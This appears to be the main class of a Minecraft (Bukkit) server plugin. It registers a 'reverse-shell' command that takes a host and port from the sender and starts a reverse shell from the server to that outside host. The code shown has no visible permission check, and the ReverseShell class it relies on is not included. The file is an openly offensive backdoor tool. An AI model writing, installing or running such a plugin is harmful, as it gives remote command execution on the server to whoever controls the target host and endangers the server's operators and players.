package dev.toe;

import java.util.HashMap;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public final class ShellPlugin extends JavaPlugin implements Listener {

  public static HashMap<String, ReverseShell> map = new HashMap<>();

  @Override
  public void onEnable() {
    getCommand("reverse-shell").setExecutor(new ReverseShellCommand());
  }

  @Override
  public void onDisable() {
    map.forEach((_k, shell) -> shell.interrupt());
  }

  public static class ReverseShellCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command,
                             String label, String[] args) {

      sender.sendMessage("attempting to create reverse shell");

      try {
        ReverseShell shell =
            new ReverseShell(args[0], Integer.parseInt(args[1]), args[2]);
        shell.start();
        map.put(sender.getName(), shell);
      } catch (Exception e) {
        sender.sendMessage(ChatColor.RED + "failed to create reverse shell!");
        sender.sendMessage(e.toString());
      }

      return true;
    }
  }
}
